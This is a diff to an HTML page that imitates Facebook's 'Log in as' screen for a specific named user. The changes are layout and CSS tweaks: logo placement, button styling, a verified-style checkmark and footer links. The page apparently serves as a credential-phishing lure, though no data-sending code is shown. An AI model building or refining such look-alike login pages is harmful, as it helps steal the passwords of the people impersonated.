@@ -33,9 +33,14 @@
             padding: 20px;
             box-sizing: border-box;
         }
-        ._97vu img {
-            width: 100%;
+        .fb_logo_container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .fb_logo {
+            width: 200px;
             height: auto;
+            margin: 0 auto;
         }
         ._4-u2 {
             background-color: #fff;
@@ -65,6 +70,8 @@
             font-size: 16px;
             cursor: pointer;
             font-weight: bold;
+            text-align: center;
+            display: block;
         }
         ._42ft:hover {
             background-color: #166fe5;
@@ -73,15 +80,21 @@
             text-align: center; /* جعل النص في الوسط */
         }
         ._xkt a {
-            display: inline-block; /* تغيير display إلى inline-block */
+            display: block; /* تغيير display إلى block */
             text-align: center;
             color: #1877f2;
             text-decoration: none;
             margin-bottom: 10px;
-            font-size: 14px;
+            font-size: 16px;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            background-color: #fff;
+            font-weight: bold;
         }
         ._xkt a:hover {
-            text-decoration: underline;
+            background-color: #f0f2f5;
+            text-decoration: none;
         }
         ._85el {
             text-align: center;
@@ -103,9 +116,30 @@
             font-size: 14px;
             color: #666;
         }
+        .login_button_container {
+            display: flex;
+            flex-direction: column;
+        }
+        .footer-links {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #666;
+        }
+        .footer-links a {
+            color: #385898;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
         @media (max-width: 480px) {
             .fb_content {
                 padding: 10px;
+            }
+            .fb_logo {
+                width: 150px;
             }
             ._4-u2 {
                 padding: 15px;
@@ -120,9 +154,12 @@
             .fsm {
                 font-size: 12px;
             }
-            .inputtext, ._42ft {
+            .inputtext, ._42ft, ._xkt a {
                 font-size: 14px;
                 padding: 10px;
+            }
+            .footer-links {
+                font-size: 11px;
             }
         }
     </style>
@@ -131,10 +168,12 @@
 <body class="_39il _97vt _97vz _97v- _97v_ _97w2 _97w0 _9ax- _9ax_ _9ay1 UIPage_LoggedOut hasBanner _-kb _605a b_c3pyn-ahh win x1 Locale_en_US" dir="ltr">
     <div id="globalContainer" class="uiContextualLayerParent">
         <div class="fb_content clearfix" id="content" role="main">
+            <!-- شعار فيسبوك في الأعلى -->
+            <div class="fb_logo_container">
+                <img class="fb_logo" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
+            </div>
+            
             <div class="_4-u5 _30ny">
-                <div class="_97vy">
-                    <img class="_97vu img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" />
-                </div>
                 <div class="_4-u2 _1w1t _4-u8 _52jv">
                     <!-- صورة الملف الشخصي -->
                     <div class="_85el">
@@ -145,7 +184,7 @@
                             <span class="_50f6">
                                 Log in as Kawtar Kawtar
                                 <svg viewBox="0 0 12 13" width="16" height="16" fill="blue" style="vertical-align: middle; margin-left: 5px;">
-                                    <title>Verified account</title>
+                                    <path d="M5.5,9.5 L3,7 L3.5,6.5 L5.5,8.5 L8.5,5.5 L9,6 L5.5,9.5 Z" fill="currentColor"/>
                                 </svg>
                             </span>
                         </div>
@@ -164,12 +203,14 @@
                                     </div>
                                 </div>
                                 <!-- زر Log In -->
-                                <div class="_xkt">
-                                    <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" type="submit">Log In</button>
-                                </div>
-                                <!-- زر Try another way -->
-                                <div class="_xkt">
-                                    <a role="button" class="_42ft _4jy0 _al4m _4jy6 _517h _51sy" name="tryanotherway" href="/recover/initiate/">Try another way</a>
+                                <div class="login_button_container">
+                                    <div class="_xkt">
+                                        <button value="1" class="_42ft _4jy0 _52e0 _4jy6 _4jy1 selected _51sy" id="loginbutton" name="login" type="submit">Log In</button>
+                                    </div>
+                                    <!-- زر Try another way -->
+                                    <div class="_xkt">
+                                        <a role="button" class="_4jy0 _al4m _4jy6 _517h _51sy" name="tryanotherway" href="/recover/initiate/">Try another way</a>
+                                    </div>
                                 </div>
                                 <!-- زر Forgot account -->
                                 <div class="_xkv fsm fwn fcg" id="login_link">
@@ -179,6 +220,14 @@
                         </form>
                     </div>
                 </div>
+            </div>
+            
+            <!-- روابط تذييل الصفحة -->
+            <div class="footer-links">
+                <a href="#">Sign Up</a> · 
+                <a href="#">Messenger</a> · 
+                <a href="#">Facebook Lite</a> · 
+                <a href="#">Help Center</a>
             </div>
         </div>
     </div>
